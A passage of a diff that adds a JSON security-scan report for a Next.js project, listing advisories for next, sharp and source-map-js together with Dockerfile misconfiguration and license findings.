+          "Fingerprint": "sha256:473e1c058f32a0e31de5bd87b8bed23665c0e509be19bcdee40f12819175de96",
+          "Title": "next: Next.js: Information disclosure via unrestricted cross-site requests on development server",
+          "Description": "Next.js is a React framework for building full-stack web applications. From 16.0.0 until 16.3.8, the `next dev` development server exposes a Model Context Protocol endpoint without reliably restricting cross-site requests. A malicious website visited by a developer can reach the endpoint and read the project's disk location, source code snippets from error reports, route inventory, and development logs. Production deployments do not serve this endpoint. This issue is fixed in version 16.3.8.",
+          "Severity": "MEDIUM",
+          "CweIDs": [
+            "CWE-346"
+          ],
+          "VendorSeverity": {
+            "ghsa": 2,
+            "nvd": 2,
+            "redhat": 2
+          },
+          "CVSS": {
+            "ghsa": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N",
+              "V40Vector": "CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:L/VI:N/VA:N/SC:N/SI:N/SA:N",
+              "V3Score": 5.3,
+              "V40Score": 6.3
+            },
+            "nvd": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N",
+              "V3Score": 5.3
+            },
+            "redhat": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:N/A:N",
+              "V3Score": 4.3
+            }
+          },
+          "References": [
+            "https://access.redhat.com/security/cve/CVE-2026-94485",
+            "https://advisory.echohq.com/cve/CVE-2026-94485",
+            "https://github.com/advisories/GHSA-f87g-xv8r-7p7x",
+            "https://github.com/vercel/next.js",
+            "https://github.com/vercel/next.js/commit/2d9f50a409312696145b82b3157aadb6b1fef476",
+            "https://github.com/vercel/next.js/releases/tag/v16.3.8",
+            "https://github.com/vercel/next.js/security/advisories/GHSA-f87g-xv8r-7p7x",
+            "https://nvd.nist.gov/vuln/detail/CVE-2026-94485",
+            "https://www.cve.org/CVERecord?id=CVE-2026-94485"
+          ],
+          "PublishedDate": "2026-10-02T16:16:51.777Z",
+          "LastModifiedDate": "2026-10-05T14:57:42.727Z"
+        },
+        {
+          "VulnerabilityID": "CVE-2026-94543",
+          "VendorIDs": [
+            "GHSA-4jqv-mc3x-m676"
+          ],
+          "PkgID": "next@16.3.1",
+          "PkgName": "next",
+          "PkgIdentifier": {
+            "PURL": "pkg:npm/next@16.3.1",
+            "UID": "fb8518510d2300f1"
+          },
+          "InstalledVersion": "16.3.1",
+          "FixedVersion": "15.5.27, 16.3.8",
+          "Status": "fixed",
+          "SeveritySource": "ghsa",
+          "PrimaryURL": "https://avd.aquasec.com/nvd/cve-2026-94543",
+          "DataSource": {
+            "ID": "ghsa",
+            "Name": "GitHub Security Advisory npm",
+            "URL": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Anpm"
+          },
+          "Fingerprint": "sha256:ffa0531f036fd8dc0335dcfc6738ac23e919f59264951437fa865f6f765d3845",
+          "Title": "next: Next.js: Response cache poisoning via improper route binding",
+          "Description": "Next.js is a React framework for building full-stack web applications. From 15.0.0 until 15.5.27 and 16.3.8, self-hosted applications using the Pages Router with statically generated or Incremental Static Regeneration pages can key a response cache entry without sufficiently binding it to the source route. A request can replace one page's cache entry with content from a different route, causing the affected page to serve incorrect content to every visitor until revalidation. Applications deployed on Vercel are not affected. This issue is fixed in versions 15.5.27 and 16.3.8.",
+          "Severity": "MEDIUM",
+          "CweIDs": [
+            "CWE-524"
+          ],
+          "VendorSeverity": {
+            "ghsa": 2,
+            "nvd": 2,
+            "redhat": 2
+          },
+          "CVSS": {
+            "ghsa": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L",
+              "V40Vector": "CVSS:4.0/AV:N/AC:H/AT:P/PR:N/UI:N/VC:N/VI:N/VA:L/SC:N/SI:N/SA:N",
+              "V3Score": 5.3,
+              "V40Score": 6.3
+            },
+            "nvd": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L",
+              "V3Score": 5.3
+            },
+            "redhat": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:L/A:L",
+              "V3Score": 4.8
+            }
+          },
+          "References": [
+            "https://access.redhat.com/security/cve/CVE-2026-94543",
+            "https://advisory.echohq.com/cve/CVE-2026-94543",
+            "https://github.com/advisories/GHSA-4jqv-mc3x-m676",
+            "https://github.com/vercel/next.js",
+            "https://github.com/vercel/next.js/commit/52c94abdd2ea5f416f5e8353ea8a2edd3fe311b8",
+            "https://github.com/vercel/next.js/commit/719e4c67d6e92df60246f95e1d96e2dd60789a52",
+            "https://github.com/vercel/next.js/releases/tag/v15.5.27",
+            "https://github.com/vercel/next.js/releases/tag/v16.3.8",
+            "https://github.com/vercel/next.js/security/advisories/GHSA-4jqv-mc3x-m676",
+            "https://nvd.nist.gov/vuln/detail/CVE-2026-94543",
+            "https://www.cve.org/CVERecord?id=CVE-2026-94543"
+          ],
+          "PublishedDate": "2026-10-02T16:16:52.077Z",
+          "LastModifiedDate": "2026-10-06T17:17:27.96Z"
+        },
+        {
+          "VulnerabilityID": "CVE-2026-94544",
+          "VendorIDs": [
+            "GHSA-3w37-wq28-93x7"
+          ],
+          "PkgID": "next@16.3.1",
+          "PkgName": "next",
+          "PkgIdentifier": {
+            "PURL": "pkg:npm/next@16.3.1",
+            "UID": "fb8518510d2300f1"
+          },
+          "InstalledVersion": "16.3.1",
+          "FixedVersion": "16.3.8",
+          "Status": "fixed",
+          "SeveritySource": "ghsa",
+          "PrimaryURL": "https://avd.aquasec.com/nvd/cve-2026-94544",
+          "DataSource": {
+            "ID": "ghsa",
+            "Name": "GitHub Security Advisory npm",
+            "URL": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Anpm"
+          },
+          "Fingerprint": "sha256:3fffff99b1028cf25558f96e80fde06a17e69a834c9a6f07e31bf758fd19b53b",
+          "Title": "next: Next.js: Information disclosure via shared cache fills in Draft Mode",
+          "Description": "Next.js is a React framework for building full-stack web applications. From 16.3.0 until 16.3.8, pending use cache fills for the same key are shared without separating Draft Mode requests from regular requests. An overlapping regular request can receive unauthenticated unpublished content from an editor's Draft Mode fill, while an overlapping Draft Mode request can receive published content from a regular fill. When the regular request prerenders a page, the draft-dependent content can persist in the generated page and be served to later visitors until revalidation. Sites are affected when Cache Components or experimental.useCache is enabled and cached functions return draft-dependent content. This issue is fixed in version 16.3.8.",
+          "Severity": "MEDIUM",
+          "CweIDs": [
+            "CWE-524"
+          ],
+          "VendorSeverity": {
+            "ghsa": 2,
+            "nvd": 2,
+            "redhat": 1
+          },
+          "CVSS": {
+            "ghsa": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:L/I:L/A:N",
+              "V40Vector": "CVSS:4.0/AV:N/AC:H/AT:P/PR:N/UI:N/VC:L/VI:N/VA:N/SC:N/SI:N/SA:N",
+              "V3Score": 4.2,
+              "V40Score": 6.3
+            },
+            "nvd": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:L/I:L/A:N",
+              "V3Score": 4.2
+            },
+            "redhat": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N",
+              "V3Score": 3.7
+            }
+          },
+          "References": [
+            "https://access.redhat.com/security/cve/CVE-2026-94544",
+            "https://github.com/vercel/next.js",
+            "https://github.com/vercel/next.js/commit/bd9214f9a32854a011bf5fe58e481dffe1bbf598",
+            "https://github.com/vercel/next.js/releases/tag/v16.3.8",
+            "https://github.com/vercel/next.js/security/advisories/GHSA-3w37-wq28-93x7",
+            "https://nvd.nist.gov/vuln/detail/CVE-2026-94544",
+            "https://www.cve.org/CVERecord?id=CVE-2026-94544"
+          ],
+          "PublishedDate": "2026-10-02T16:16:52.217Z",
+          "LastModifiedDate": "2026-10-05T21:16:38.233Z"
+        },
+        {
+          "VulnerabilityID": "CVE-2026-94486",
+          "VendorIDs": [
+            "GHSA-39w2-rjm5-chcv"
+          ],
+          "PkgID": "next@16.3.1",
+          "PkgName": "next",
+          "PkgIdentifier": {
+            "PURL": "pkg:npm/next@16.3.1",
+            "UID": "fb8518510d2300f1"
+          },
+          "InstalledVersion": "16.3.1",
+          "FixedVersion": "16.3.8",
+          "Status": "fixed",
+          "SeveritySource": "ghsa",
+          "PrimaryURL": "https://avd.aquasec.com/nvd/cve-2026-94486",
+          "DataSource": {
+            "ID": "ghsa",
+            "Name": "GitHub Security Advisory npm",
+            "URL": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Anpm"
+          },
+          "Fingerprint": "sha256:f43968c53f8c5eea00907d1a6803a2712ea8430ad040f4f0bd68749d2406fbce",
+          "Title": "next: Next.js: Information disclosure via unrestricted cross-site requests",
+          "Description": "Next.js is a React framework for building full-stack web applications. From 16.0.0 until 16.3.8, the next dev development server exposes a Model Context Protocol endpoint without reliably restricting cross-site requests. A malicious website visited by a developer can reach the endpoint and read the project's disk location, source code snippets from error reports, route inventory, and development logs. Production deployments do not serve this endpoint. This issue is fixed in version 16.3.8.",
+          "Severity": "LOW",
+          "CweIDs": [
+            "CWE-346"
+          ],
+          "VendorSeverity": {
+            "ghsa": 1,
+            "nvd": 2,
+            "redhat": 2
+          },
+          "CVSS": {
+            "ghsa": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N",
+              "V40Vector": "CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:P/VC:L/VI:L/VA:N/SC:N/SI:N/SA:N",
+              "V3Score": 5.4,
+              "V40Score": 2.3
+            },
+            "nvd": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N",
+              "V3Score": 5.4
+            },
+            "redhat": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:N/A:N",
+              "V3Score": 4.3
+            }
+          },
+          "References": [
+            "https://access.redhat.com/security/cve/CVE-2026-94486",
+            "https://advisory.echohq.com/cve/CVE-2026-94486",
+            "https://github.com/advisories/GHSA-39w2-rjm5-chcv",
+            "https://github.com/vercel/next.js",
+            "https://github.com/vercel/next.js/commit/2d9f50a409312696145b82b3157aadb6b1fef476",
+            "https://github.com/vercel/next.js/releases/tag/v16.3.8",
+            "https://github.com/vercel/next.js/security/advisories/GHSA-39w2-rjm5-chcv",
+            "https://nvd.nist.gov/vuln/detail/CVE-2026-94486",
+            "https://www.cve.org/CVERecord?id=CVE-2026-94486"
+          ],
+          "PublishedDate": "2026-10-02T16:16:51.933Z",
+          "LastModifiedDate": "2026-10-05T14:58:14.647Z"
+        },
+        {
+          "VulnerabilityID": "GHSA-rgj7-g3m4-5g8c",
+          "PkgID": "sharp@0.35.3",
+          "PkgName": "sharp",
+          "PkgIdentifier": {
+            "PURL": "pkg:npm/sharp@0.35.3",
+            "UID": "a3b2d5cf3215c021"
+          },
+          "InstalledVersion": "0.35.3",
+          "FixedVersion": "0.35.4",
+          "Status": "fixed",
+          "SeveritySource": "ghsa",
+          "PrimaryURL": "https://github.com/advisories/GHSA-rgj7-g3m4-5g8c",
+          "DataSource": {
+            "ID": "ghsa",
+            "Name": "GitHub Security Advisory npm",
+            "URL": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Anpm"
+          },
+          "Fingerprint": "sha256:56d15759fa87cb27d477c8e7fab6872b67d46ff67ab2d1a501210c39128ad164",
+          "Title": "sharp: Vulnerabilities in libheif: GHSA-g89c-p67h-r497 and GHSA-2jg2-4ch7-h545",
+          "Description": "### Impact\nA number of vulnerabilities, two rated as \"Critical\" severity using CVSSv3, have been discovered and fixed in the upstream libheif dependency. These can lead to possible remote code execution (RCE) on glibc-based Linux when run under certain conditions.\n\nThe attack vector for these claims to be \"network\" however sharp does not provide any networking features so this vulnerability is down-rated to a \"High\" severity using CVSSv4 but please note its Subsequent System Impact.\n\nThose processing untrusted input with versions of sharp prior to 0.35.4 are affected.\n\n### Patches\n\n#### Using prebuilt binaries provided by sharp?\n\nMost people rely on the prebuilt binaries provided by sharp.\n\nPlease upgrade sharp to the latest version, currently 0.35.4, which provides libheif 1.23.2.\n\n#### Using a globally-installed libheif?\n\nPlease ensure you are using the latest libheif 1.23.2.\n\n### Workarounds\nAdd the following to your code to prevent sharp from decoding AVIF images.\n```js\nsharp.block({ operation: [\"VipsForeignLoadHeif\"] });\n```\n\nEnsure you are using a `node` executable binary compiled as a Position Independent Executable (PIE). Most Linux package managers already do this for protection against RCE however be warned that the \"official\" Node.js binaries do not.\n\n### References\n- [CVE-2026-84383](https://github.com/strukturag/libheif/security/advisories/GHSA-g89c-p67h-r497)\n- https://github.com/strukturag/libheif/security/advisories/GHSA-2jg2-4ch7-h545",
+          "Severity": "HIGH",
+          "VendorSeverity": {
+            "ghsa": 3
+          },
+          "CVSS": {
+            "ghsa": {
+              "V40Vector": "CVSS:4.0/AV:L/AC:L/AT:P/PR:N/UI:N/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H",
+              "V40Score": 8.9
+            }
+          },
+          "References": [
+            "https://advisory.echohq.com/cve/GHSA-rgj7-g3m4-5g8c",
+            "https://github.com/advisories/GHSA-rgj7-g3m4-5g8c",
+            "https://github.com/lovell/sharp",
+            "https://github.com/lovell/sharp/releases/tag/v0.35.4",
+            "https://github.com/lovell/sharp/security/advisories/GHSA-rgj7-g3m4-5g8c",
+            "https://github.com/strukturag/libheif/security/advisories/GHSA-2jg2-4ch7-h545",
+            "https://github.com/strukturag/libheif/security/advisories/GHSA-g89c-p67h-r497"
+          ],
+          "PublishedDate": "2026-09-08T21:25:11Z",
+          "LastModifiedDate": "2026-09-08T21:25:11Z"
+        },
+        {
+          "VulnerabilityID": "GHSA-wq5f-xc86-pv6w",
+          "PkgID": "sharp@0.35.3",
+          "PkgName": "sharp",
+          "PkgIdentifier": {
+            "PURL": "pkg:npm/sharp@0.35.3",
+            "UID": "a3b2d5cf3215c021"
+          },
+          "InstalledVersion": "0.35.3",
+          "FixedVersion": "0.35.5",
+          "Status": "fixed",
+          "SeveritySource": "ghsa",
+          "PrimaryURL": "https://github.com/advisories/GHSA-wq5f-xc86-pv6w",
+          "DataSource": {
+            "ID": "ghsa",
+            "Name": "GitHub Security Advisory npm",
+            "URL": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Anpm"
+          },
+          "Fingerprint": "sha256:2c84cf46f1ae774a55baf3d54e63bc426cc616d77dff7e281e79e74e3e12add3",
+          "Title": "sharp : Vulnerability in librsvg dependency CVE-2026-96889",
+          "Description": "### Impact\n\nA memory-related vulnerability has been discovered and fixed in the upstream librsvg dependency. When certain runtime-specific conditions apply, this vulnerability can lead to possible remote code execution (RCE) on glibc-based Linux.\n\n### Patches\n\n#### Using prebuilt binaries provided by sharp?\n\nMost people rely on the prebuilt binaries provided by sharp.\n\nPlease upgrade sharp to the latest version, currently 0.35.5, which provides librsvg 2.63.2.\n\n#### Using a globally-installed librsvg?\n\nPlease ensure you are using the latest librsvg 2.63.2.\n\n### Workarounds\n\nAdd the following to your code to prevent sharp from decoding SVG images.\n```js\nsharp.block({ operation: [\"VipsForeignLoadSvg\"] });\n```\n\nTo avoid RCE, ensure you are using a `node` executable binary compiled as a Position Independent Executable (PIE). Most Linux package managers already use this security-hardening feature however be warned that the \"official\" Node.js binaries do not.\n1",
+          "Severity": "HIGH",
+          "VendorSeverity": {
+            "ghsa": 3
+          },
+          "CVSS": {
+            "ghsa": {
+              "V40Vector": "CVSS:4.0/AV:L/AC:L/AT:P/PR:N/UI:N/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H",
+              "V40Score": 8.9
+            }
+          },
+          "References": [
+            "https://advisory.echohq.com/cve/GHSA-wq5f-xc86-pv6w",
+            "https://github.com/advisories/GHSA-wq5f-xc86-pv6w",
+            "https://github.com/lovell/sharp",
+            "https://github.com/lovell/sharp/commit/96de105d9d36ab04c76c2b78b97255171630d236",
+            "https://github.com/lovell/sharp/releases/tag/v0.35.5",
+            "https://github.com/lovell/sharp/security/advisories/GHSA-wq5f-xc86-pv6w",
+            "https://gitlab.gnome.org/GNOME/librsvg/-/work_items/1241",
+            "https://www.cve.org/CVERecord?id=CVE-2026-96889"
+          ],
+          "PublishedDate": "2026-10-06T13:43:57Z",
+          "LastModifiedDate": "2026-10-06T13:43:57Z"
+        },
+        {
+          "VulnerabilityID": "CVE-2026-93749",
+          "VendorIDs": [
+            "GHSA-68fv-2mgg-jv7q"
+          ],
+          "PkgID": "source-map-js@1.2.1",
+          "PkgName": "source-map-js",
+          "PkgIdentifier": {
+            "PURL": "pkg:npm/source-map-js@1.2.1",
+            "UID": "2f051fe8bb50fd1d"
+          },
+          "InstalledVersion": "1.2.1",
+          "FixedVersion": "1.2.2",
+          "Status": "fixed",
+          "SeveritySource": "ghsa",
+          "PrimaryURL": "https://avd.aquasec.com/nvd/cve-2026-93749",
+          "DataSource": {
+            "ID": "ghsa",
+            "Name": "GitHub Security Advisory npm",
+            "URL": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Anpm"
+          },
+          "Fingerprint": "sha256:d580b97d9d5a5afbbbd1add62934fb8d06b46270f556e5b1eff22ba0caf721c2",
+          "Title": "source-map-js: source-map-js: Denial of Service via malformed indexed source maps",
+          "Description": "source-map-js through 1.2.1 fails to validate the per-section offset line value in indexed source maps, allowing attackers to specify arbitrary numeric values. Attackers can supply extremely large offset line values that cause synchronous event loop blocking for extended periods, preventing the service from handling other requests.",
+          "Severity": "HIGH",
+          "CweIDs": [
+            "CWE-1284"
+          ],
+          "VendorSeverity": {
+            "amazon": 3,
+            "ghsa": 3,
+            "redhat": 3
+          },
+          "CVSS": {
+            "ghsa": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+              "V40Vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N",
+              "V3Score": 7.5,
+              "V40Score": 8.7
+            },
+            "redhat": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+              "V3Score": 7.5
+            }
+          },
+          "References": [
+            "https://access.redhat.com/security/cve/CVE-2026-93749",
+            "https://advisory.echohq.com/cve/CVE-2026-93749",
+            "https://github.com/7rulnik/source-map-js",
+            "https://github.com/7rulnik/source-map-js/blob/c1cd8904bb7bd0c7fb5879fcda48134d82a27934/lib/source-node.js#L115-L118",
+            "https://github.com/7rulnik/source-map-js/commit/cf7658058ceeaa8619d5ae0ec90be6905209d016",
+            "https://github.com/7rulnik/source-map-js/issues/76",
+            "https://github.com/7rulnik/source-map-js/pull/79",
+            "https://github.com/7rulnik/source-map-js/releases/tag/v1.2.2",
+            "https://nvd.nist.gov/vuln/detail/CVE-2026-93749",
+            "https://www.cve.org/CVERecord?id=CVE-2026-93749",
+            "https://www.vulncheck.com/advisories/source-map-js-through-1.2.1-event-loop-denial-of-service"
+          ],
+          "PublishedDate": "2026-09-18T18:18:33.48Z",
+          "LastModifiedDate": "2026-09-22T20:25:55.87Z"
+        }
+      ]
+    },
+    {
+      "Target": "Dockerfile",
+      "Class": "config",
+      "Type": "dockerfile",
+      "MisconfSummary": {
+        "Successes": 25,
+        "Failures": 2
+      },
+      "Misconfigurations": [
+        {
+          "Type": "Dockerfile Security Check",
+          "ID": "DS-0002",
+          "Title": "Image user should not be 'root'",
+          "Description": "Running containers with 'root' user can lead to a container escape situation. It is a best practice to run containers as non-root users, which can be done by adding a 'USER' statement to the Dockerfile.",
+          "Message": "Specify at least 1 USER command in Dockerfile with non-root user as argument",
+          "Namespace": "builtin.dockerfile.DS002",
+          "Query": "data.builtin.dockerfile.DS002.deny",
+          "Resolution": "Add 'USER \u003cnon root user name\u003e' line to the Dockerfile",
+          "Severity": "HIGH",
+          "PrimaryURL": "https://avd.aquasec.com/misconfig/ds-0002",
+          "References": [
+            "https://docs.docker.com/develop/develop-images/dockerfile_best-practices/",
+            "https://avd.aquasec.com/misconfig/ds-0002"
+          ],
+          "Status": "FAIL",
+          "CauseMetadata": {
+            "Provider": "Dockerfile",
+            "Service": "general"
+          }
+        },
+        {
+          "Type": "Dockerfile Security Check",
+          "ID": "DS-0026",
+          "Title": "No HEALTHCHECK defined",
+          "Description": "You should add HEALTHCHECK instruction in your docker container images to perform the health check on running containers.",
+          "Message": "Add HEALTHCHECK instruction in your Dockerfile",
+          "Namespace": "builtin.dockerfile.DS026",
+          "Query": "data.builtin.dockerfile.DS026.deny",
+          "Resolution": "Add HEALTHCHECK instruction in Dockerfile",
+          "Severity": "LOW",
+          "PrimaryURL": "https://avd.aquasec.com/misconfig/ds-0026",
+          "References": [
+            "https://blog.aquasec.com/docker-security-best-practices",
+            "https://avd.aquasec.com/misconfig/ds-0026"
+          ],
+          "Status": "FAIL",
+          "CauseMetadata": {
+            "Provider": "Dockerfile",
+            "Service": "general"
+          }
+        }
+      ]
+    },
+    {
+      "Target": "package-lock.json",
+      "Class": "license",
+      "Licenses": [
+        {
+          "Severity": "LOW",
+          "Category": "notice",
+          "PkgName": "canvas-confetti",
+          "FilePath": "package-lock.json",
+          "Name": "ISC",
+          "Text": "",
+          "Confidence": 1,
+          "Link": ""
+        },
+        {
+          "Severity": "LOW",
+          "Category": "notice",
+          "PkgName": "clsx",
+          "FilePath": "package-lock.json",
+          "Name": "MIT",
+          "Text": "",
+          "Confidence": 1,
+          "Link": ""
+        },
+        {
+          "Severity": "LOW",
+          "Category": "notice",
+          "PkgName": "html2canvas",
+          "FilePath": "package-lock.json",
+          "Name": "MIT",
+          "Text": "",
+          "Confidence": 1,
+          "Link": ""
+        },
+        {
+          "Severity": "LOW",
+          "Category": "notice",
+          "PkgName": "jspdf",
+          "FilePath": "package-lock.json",
+          "Name": "MIT",
+          "Text": "",
+          "Confidence": 1,
+          "Link": ""
+        },
+        {
+          "Severity": "LOW",
+          "Category": "notice",
+          "PkgName": "lucide-react",
+          "FilePath": "package-lock.json",
+          "Name": "ISC",
+          "Text": "",
+          "Confidence": 1,
+          "Link": ""
+        },
+        {
+          "Severity": "LOW",
+          "Category": "notice",
+          "PkgName": "next",
+          "FilePath": "package-lock.json",
+          "Name": "MIT",
+          "Text": "",
+          "Confidence": 1,
+          "Link": ""
+        },
+        {
+          "Severity": "LOW",
+          "Category": "notice",
+          "PkgName": "react",
+          "FilePath": "package-lock.json",
+          "Name": "MIT",
+          "Text": "",
+          "Confidence": 1,
+          "Link": ""
+        },
+        {
+          "Severity": "LOW",
+          "Category": "notice",
+          "PkgName": "react-dom",
+          "FilePath": "package-lock.json",
+          "Name": "MIT",
+          "Text": "",
+          "Confidence": 1,
+          "Link": ""
+        },
+        {
+          "Severity": "LOW",
+          "Category": "notice",
+          "PkgName": "tailwind-merge",
+          "FilePath": "package-lock.json",
+          "Name": "MIT",
+          "Text": "",
+          "Confidence": 1,
+          "Link": ""
+        },
+        {
+          "Severity": "LOW",
+          "Category": "notice",
+          "PkgName": "@babel/runtime",
+          "FilePath": "package-lock.json",
+          "Name": "MIT",
+          "Text": "",
+          "Confidence": 1,
+          "Link": ""
+        },
+        {
+          "Severity": "LOW",
+          "Category": "notice",
+          "PkgName": "@emnapi/runtime",
+          "FilePath": "package-lock.json",
+          "Name": "MIT",
+          "Text": "",
+          "Confidence": 1,
+          "Link": ""
+        },
+        {
+          "Severity": "LOW",
+          "Category": "notice",
+          "PkgName": "@img/colour",
+          "FilePath": "package-lock.json",
+          "Name": "MIT",
+          "Text": "",
+          "Confidence": 1,
+          "Link": ""
+        },
+        {
+          "Severity": "LOW",
+          "Category": "notice",
+          "PkgName": "@img/sharp-darwin-arm64",
+          "FilePath": "package-lock.json",
+          "Name": "Apache-2.0",
+          "Text": "",
+          "Confidence": 1,
+          "Link": ""
+        },
+        {
+          "Severity": "LOW",
+          "Category": "notice",
+          "PkgName": "@img/sharp-darwin-x64",
+          "FilePath": "package-lock.json",
+          "Name": "Apache-2.0",
+          "Text": "",
+          "Confidence": 1,
+          "Link": ""
+        },
+        {
+          "Severity": "LOW",
+          "Category": "notice",
+          "PkgName": "@img/sharp-freebsd-wasm32",
+          "FilePath": "package-lock.json",
+          "Name": "Apache-2.0",
+          "Text": "",
+          "Confidence": 1,
+          "Link": ""
+        },
+        {
+          "Severity": "HIGH",
+          "Category": "restricted",
+          "PkgName": "@img/sharp-libvips-darwin-arm64",
+          "FilePath": "package-lock.json",
+          "Name": "LGPL-3.0-or-later",
+          "Text": "",
+          "Confidence": 1,
+          "Link": ""
+        },
+        {
+          "Severity": "HIGH",
+          "Category": "restricted",
+          "PkgName": "@img/sharp-libvips-darwin-x64",
+          "FilePath": "package-lock.json",
+          "Name": "LGPL-3.0-or-later",
+          "Text": "",
+          "Confidence": 1,
+          "Link": ""
+        },
+        {
+          "Severity": "HIGH",
+          "Category": "restricted",
+          "PkgName": "@img/sharp-libvips-linux-arm",
+          "FilePath": "package-lock.json",
+          "Name": "LGPL-3.0-or-later",
+          "Text": "",
+          "Confidence": 1,
+          "Link": ""
+        },
+        {
+          "Severity": "HIGH",
+          "Category": "restricted",
+          "PkgName": "@img/sharp-libvips-linux-arm64",
+          "FilePath": "package-lock.json",
+          "Name": "LGPL-3.0-or-later",
+          "Text": "",
+          "Confidence": 1,
+          "Link": ""
+        },
+        {
+          "Severity": "HIGH",
+          "Category": "restricted",
+          "PkgName": "@img/sharp-libvips-linux-ppc64",
+          "FilePath": "package-lock.json",
+          "Name": "LGPL-3.0-or-later",
+          "Text": "",
+          "Confidence": 1,
+          "Link": ""
+        },
+        {
+          "Severity": "HIGH",
+          "Category": "restricted",
+          "PkgName": "@img/sharp-libvips-linux-riscv64",
+          "FilePath": "package-lock.json",
+          "Name": "LGPL-3.0-or-later",
+          "Text": "",
+          "Confidence": 1,
+          "Link": ""
+        },
+        {
+          "Severity": "HIGH",
+          "Category": "restricted",
+          "PkgName": "@img/sharp-libvips-linux-s390x",
+          "FilePath": "package-lock.json",
+          "Name": "LGPL-3.0-or-later",
+          "Text": "",
+          "Confidence": 1,
+          "Link": ""
+        },
+        {
+          "Severity": "HIGH",
+          "Category": "restricted",
+          "PkgName": "@img/sharp-libvips-linux-x64",
+          "FilePath": "package-lock.json",
+          "Name": "LGPL-3.0-or-later",
+          "Text": "",
+          "Confidence": 1,
+          "Link": ""
+        },
+        {
+          "Severity": "HIGH",
+          "Category": "restricted",
+          "PkgName": "@img/sharp-libvips-linuxmusl-arm64",
+          "FilePath": "package-lock.json",
+          "Name": "LGPL-3.0-or-later",
+          "Text": "",
+          "Confidence": 1,
+          "Link": ""
+        },
+        {
+          "Severity": "HIGH",
+          "Category": "restricted",
+          "PkgName": "@img/sharp-libvips-linuxmusl-x64",
+          "FilePath": "package-lock.json",
+          "Name": "LGPL-3.0-or-later",
+          "Text": "",
+          "Confidence": 1,
+          "Link": ""
+        },
+        {
+          "Severity": "LOW",
+          "Category": "notice",
+          "PkgName": "@img/sharp-linux-arm",
+          "FilePath": "package-lock.json",
+          "Name": "Apache-2.0",
+          "Text": "",
+          "Confidence": 1,
+          "Link": ""
+        },
+        {
+          "Severity": "LOW",
+          "Category": "notice",
+          "PkgName": "@img/sharp-linux-arm64",
+          "FilePath": "package-lock.json",
+          "Name": "Apache-2.0",
+          "Text": "",
+          "Confidence": 1,
+          "Link": ""
+        },
+        {
+          "Severity": "LOW",
+          "Category": "notice",
+          "PkgName": "@img/sharp-linux-ppc64",
+          "FilePath": "package-lock.json",
+          "Name": "Apache-2.0",
+          "Text": "",
+          "Confidence": 1,
+          "Link": ""
+        },
+        {
+          "Severity": "LOW",
+          "Category": "notice",
+          "PkgName": "@img/sharp-linux-riscv64",
+          "FilePath": "package-lock.json",
+          "Name": "Apache-2.0",
+          "Text": "",
+          "Confidence": 1,
+          "Link": ""
+        },
+        {
+          "Severity": "LOW",
+          "Category": "notice",
+          "PkgName": "@img/sharp-linux-s390x",
+          "FilePath": "package-lock.json",
+          "Name": "Apache-2.0",
+          "Text": "",
+          "Confidence": 1,
+          "Link": ""
+        },
+        {
+          "Severity": "LOW",
+          "Category": "notice",
+          "PkgName": "@img/sharp-linux-x64",
+          "FilePath": "package-lock.json",
+          "Name": "Apache-2.0",
+          "Text": "",
+          "Confidence": 1,
+          "Link": ""
+        },
+        {
+          "Severity": "LOW",
+          "Category": "notice",
+          "PkgName": "@img/sharp-linuxmusl-arm64",
+          "FilePath": "package-lock.json",
+          "Name": "Apache-2.0",
+          "Text": "",
+          "Confidence": 1,
+          "Link": ""
+        },
+        {
+          "Severity": "LOW",
+          "Category": "notice",
+          "PkgName": "@img/sharp-linuxmusl-x64",
+          "FilePath": "package-lock.json",
+          "Name": "Apache-2.0",
+          "Text": "",
+          "Confidence": 1,
+          "Link": ""
+        },
+        {
+          "Severity": "HIGH",
+          "Category": "restricted",
+          "PkgName": "@img/sharp-wasm32",
+          "FilePath": "package-lock.json",
+          "Name": "Apache-2.0 AND LGPL-3.0-or-later AND MIT",
+          "Text": "",
+          "Confidence": 1,
+          "Link": ""
+        },
+        {
+          "Severity": "LOW",
+          "Category": "notice",
+          "PkgName": "@img/sharp-webcontainers-wasm32",
+          "FilePath": "package-lock.json",
+          "Name": "Apache-2.0",
+          "Text": "",
+          "Confidence": 1,
+          "Link": ""
+        },
+        {
+          "Severity": "HIGH",
+          "Category": "restricted",
+          "PkgName": "@img/sharp-win32-arm64",
+          "FilePath": "package-lock.json",
+          "Name": "Apache-2.0 AND LGPL-3.0-or-later",
+          "Text": "",
+          "Confidence": 1,
+          "Link": ""
+        },
